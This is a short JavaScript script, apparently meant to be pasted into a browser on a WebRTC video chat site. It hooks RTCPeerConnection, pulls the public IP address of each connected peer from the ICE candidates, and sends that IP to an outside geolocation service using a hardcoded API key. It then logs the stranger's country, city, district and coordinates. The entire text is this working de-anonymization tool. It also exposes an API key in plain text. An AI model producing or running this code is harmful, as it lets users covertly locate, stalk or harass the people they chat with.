let apiKey = '034d7b8c901c4fd3be9da9d7fa4af926';

window.oRTCPeerConnection =
	window.oRTCPeerConnection || window.RTCPeerConnection;

window.RTCPeerConnection = function (...args) {
	const pc = new window.oRTCPeerConnection(...args);

	pc.oaddIceCandidate = pc.addIceCandidate;

	pc.addIceCandidate = function (iceCandidate, ...rest) {
		const fields = iceCandidate.candidate.split(' ');

		console.log(iceCandidate.candidate);
		const ip = fields[4];
		if (fields[7] === 'srflx') {
			getLocation(ip);
		}
		return pc.oaddIceCandidate(iceCandidate, ...rest);
	};
	return pc;
};

let getLocation = async (ip) => {
	let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;

	await fetch(url).then((response) =>
		response.json().then((json) => {
			const output = `
          ---------------------
          Country: ${json.country_name}
          State: ${json.state_prov}
          City: ${json.city}
          District: ${json.district}
          Lat / Long: (${json.latitude}, ${json.longitude})
          ---------------------
          `;
			console.log(output);
		})
	);
};